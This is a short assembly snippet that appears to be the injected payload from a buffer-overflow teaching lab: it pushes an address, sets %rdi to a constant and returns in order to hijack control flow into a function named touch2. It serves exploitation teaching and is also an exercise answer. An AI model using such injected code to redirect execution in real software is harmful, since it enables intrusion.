# modify %rdi and get into touch2()
pushq $0x00000000004017ec
movq $0x59b997fa, %rdi
ret
